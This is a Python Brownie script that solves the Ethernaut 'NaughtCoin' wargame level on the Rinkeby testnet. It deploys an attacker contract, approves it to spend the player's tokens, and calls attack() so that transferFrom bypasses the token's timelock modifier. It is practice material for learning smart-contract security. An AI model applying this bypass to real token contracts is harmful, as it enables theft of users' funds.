from multiprocessing.connection import wait
from brownie import *
from brownie.network.state import Chain
from web3 import Web3

import time
import json
import os

# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# attacker=accounts[0]
acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0x3f7c3a4A0Afd7964a669f7D18945d2dc88861ab2'
target_ct=interface.NaughtCoin(target_address)

# deploy attacker contract
attacker_contract=naughtcoinAttack.deploy(target_address, {'from': attacker, 'priority_fee': priority_fee})

def main():

    print('player_address: ', target_ct.player())
    balance=target_ct.balanceOf(attacker)
    print('player balance: ', balance)

    # allow the attacker contract to spend the tokens
    tx1=target_ct.approve(attacker_contract, balance, {'from': attacker, 'priority_fee': priority_fee})
    
    print('tx1: ', tx1)

    # the attacker contract will use the tranferFrom() funciotn, not using the custom modifyer in which th timelock is implemented
    tx=attacker_contract.attack(balance, {'from': attacker, 'priority_fee': priority_fee, 'gas_limit': 1000000})

    print('player balance after attack: ', target_ct.balanceOf(attacker))

    # print('attacker_contract:', attacker_contract)
    # send some ETH to the attacker contract
    # attacker.transfer(attacker_contract.address, amount=1, priority_fee=priority_fee)
    # print('attacker_contract balance: ', attacker_contract.balance())
    # tx=attacker_contract.attack({'from': attacker, 'priority_fee': priority_fee, 'gas_limit': 1000000})
    balance=target_ct.balanceOf(attacker)
    print('player balance: ', balance)
    print('attacker_contract balance: ', target_ct.balanceOf(attacker_contract))
    # print('target_ct balance: ', target_ct.balance())
   
